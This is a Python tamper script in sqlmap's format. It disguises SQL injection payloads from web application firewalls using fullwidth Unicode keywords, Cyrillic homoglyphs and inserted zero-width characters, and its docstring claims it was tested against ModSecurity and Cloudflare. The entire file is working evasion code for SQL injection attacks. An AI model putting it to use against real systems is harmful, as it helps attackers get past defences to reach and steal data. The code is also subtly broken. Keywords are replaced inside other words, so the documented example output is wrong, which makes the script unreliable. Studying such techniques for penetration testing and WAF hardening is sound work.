#!/usr/bin/env python

# Author: CyberVaca , Luis Vacas de Santos
# Twitter: https://twitter.com/CyberVaca_

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.enums import PRIORITY
from lib.core.compat import xrange

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

# Mapping of ASCII to Unicode Fullwidth equivalents
FULLWIDTH_MAP = {
    'A': '\uff21', 'B': '\uff22', 'C': '\uff23', 'D': '\uff24', 'E': '\uff25',
    'F': '\uff26', 'G': '\uff27', 'H': '\uff28', 'I': '\uff29', 'J': '\uff2a',
    'K': '\uff2b', 'L': '\uff2c', 'M': '\uff2d', 'N': '\uff2e', 'O': '\uff2f',
    'P': '\uff30', 'Q': '\uff31', 'R': '\uff32', 'S': '\uff33', 'T': '\uff34',
    'U': '\uff35', 'V': '\uff36', 'W': '\uff37', 'X': '\uff38', 'Y': '\uff39',
    'Z': '\uff3a',
    'a': '\uff41', 'b': '\uff42', 'c': '\uff43', 'd': '\uff44', 'e': '\uff45',
    'f': '\uff46', 'g': '\uff47', 'h': '\uff48', 'i': '\uff49', 'j': '\uff4a',
    'k': '\uff4b', 'l': '\uff4c', 'm': '\uff4d', 'n': '\uff4e', 'o': '\uff4f',
    'p': '\uff50', 'q': '\uff51', 'r': '\uff52', 's': '\uff53', 't': '\uff54',
    'u': '\uff55', 'v': '\uff56', 'w': '\uff57', 'x': '\uff58', 'y': '\uff59',
    'z': '\uff5a',
    '0': '\uff10', '1': '\uff11', '2': '\uff12', '3': '\uff13', '4': '\uff14',
    '5': '\uff15', '6': '\uff16', '7': '\uff17', '8': '\uff18', '9': '\uff19',
    ' ': '\u3000',  # Ideographic space
    '(': '\uff08', ')': '\uff09',
    '[': '\uff3b', ']': '\uff3d',
    '{': '\uff5b', '}': '\uff5d',
    '<': '\uff1c', '>': '\uff1e',
    '=': '\uff1d', '+': '\uff0b', '-': '\uff0d',
    '*': '\uff0a', '/': '\uff0f', '\\': '\uff3c',
    '\'': '\uff07', '"': '\uff02',
    ',': '\uff0c', '.': '\uff0e', ';': '\uff1b', ':': '\uff1a',
    '!': '\uff01', '?': '\uff1f', '@': '\uff20',
    '#': '\uff03', '$': '\uff04', '%': '\uff05',
    '&': '\uff06', '_': '\uff3f', '|': '\uff5c',
}

# SQL keywords to convert (case-insensitive)
SQL_KEYWORDS = [
    'SELECT', 'FROM', 'WHERE', 'AND', 'OR', 'UNION', 'INSERT', 'UPDATE',
    'DELETE', 'DROP', 'CREATE', 'ALTER', 'TABLE', 'DATABASE', 'INTO',
    'VALUES', 'SET', 'ORDER', 'BY', 'GROUP', 'HAVING', 'LIMIT', 'OFFSET',
    'JOIN', 'LEFT', 'RIGHT', 'INNER', 'OUTER', 'ON', 'AS', 'LIKE', 'IN',
    'BETWEEN', 'IS', 'NULL', 'NOT', 'EXISTS', 'CASE', 'WHEN', 'THEN',
    'ELSE', 'END', 'CAST', 'CONVERT', 'CONCAT', 'SUBSTRING', 'CHAR',
    'ASCII', 'LENGTH', 'COUNT', 'SUM', 'AVG', 'MAX', 'MIN', 'SLEEP',
    'BENCHMARK', 'WAITFOR', 'DELAY', 'EXEC', 'EXECUTE', 'LOAD_FILE',
    'OUTFILE', 'DUMPFILE', 'INFORMATION_SCHEMA', 'SCHEMA', 'COLUMNS',
    'TABLES', 'VERSION', 'USER', 'CURRENT_USER', 'SYSTEM_USER',
]

def tamper(payload, **kwargs):
    """
    Converts SQL keywords to Unicode Fullwidth characters to bypass WAF pattern matching

    Requirement:
        * Backend that normalizes Unicode (many modern frameworks do)

    Tested against:
        * WAFs without Unicode normalization
        * ModSecurity with default CRS
        * Cloudflare WAF (some rules)
        * Pattern-based WAFs

    Notes:
        * Unicode Fullwidth characters (U+FF00-U+FFEF) look similar to ASCII
        * Many backends normalize these to ASCII equivalents before processing
        * WAFs often don't normalize, so patterns like 'SELECT' won't match 'ＳＥＬＥＣＴ'
        * Example: SELECT -> ＳＥＬＥＣＴ (visually similar but different bytes)

    Reference:
        * https://medium.com/@gasmask/bypassing-wafs-in-2025-new-techniques-and-evasion-tactics

    >>> tamper('SELECT * FROM users')
    '\uff33\uff25\uff2c\uff25\uff23\uff34 * \uff26\uff32\uff2f\uff2d users'
    """

    if payload:
        retVal = payload
        
        # Convert SQL keywords to fullwidth
        for keyword in SQL_KEYWORDS:
            # Case-insensitive replacement
            pattern = re.compile(re.escape(keyword), re.IGNORECASE)
            
            def replace_with_fullwidth(match):
                original = match.group(0)
                result = ""
                for char in original:
                    if char.upper() in FULLWIDTH_MAP:
                        # Preserve original case in fullwidth
                        if char.isupper():
                            result += FULLWIDTH_MAP[char.upper()]
                        else:
                            result += FULLWIDTH_MAP[char.lower()]
                    else:
                        result += char
                return result
            
            retVal = pattern.sub(replace_with_fullwidth, retVal)
        
        return retVal
    
    return payload


def tamper_homoglyphs(payload, **kwargs):
    """
    Replaces characters with visually similar Unicode homoglyphs
    """
    
    # Homoglyph mappings (visually similar characters)
    HOMOGLYPHS = {
        'a': '\u0430',  # Cyrillic а
        'c': '\u0441',  # Cyrillic с
        'e': '\u0435',  # Cyrillic е
        'o': '\u043e',  # Cyrillic о
        'p': '\u0440',  # Cyrillic р
        'x': '\u0445',  # Cyrillic х
        'y': '\u0443',  # Cyrillic у
        'A': '\u0410',  # Cyrillic А
        'B': '\u0412',  # Cyrillic В
        'C': '\u0421',  # Cyrillic С
        'E': '\u0415',  # Cyrillic Е
        'H': '\u041d',  # Cyrillic Н
        'K': '\u041a',  # Cyrillic К
        'M': '\u041c',  # Cyrillic М
        'O': '\u041e',  # Cyrillic О
        'P': '\u0420',  # Cyrillic Р
        'T': '\u0422',  # Cyrillic Т
        'X': '\u0425',  # Cyrillic Х
    }
    
    if payload:
        retVal = ""
        for char in payload:
            if char in HOMOGLYPHS:
                retVal += HOMOGLYPHS[char]
            else:
                retVal += char
        return retVal
    
    return payload


def tamper_combining_chars(payload, **kwargs):
    """
    Inserts Unicode combining characters that may be stripped by backend
    but confuse WAF pattern matching
    """
    
    # Combining characters (zero-width, diacritics, etc.)
    COMBINING_CHARS = [
        '\u200b',  # Zero-width space
        '\u200c',  # Zero-width non-joiner
        '\u200d',  # Zero-width joiner
        '\ufeff',  # Zero-width no-break space (BOM)
        '\u034f',  # Combining grapheme joiner
    ]
    
    if payload:
        retVal = ""
        for i, char in enumerate(payload):
            retVal += char
            # Insert combining char after every few characters in keywords
            if char.isalpha() and i % 3 == 0:
                retVal += COMBINING_CHARS[i % len(COMBINING_CHARS)]
        return retVal
    
    return payload
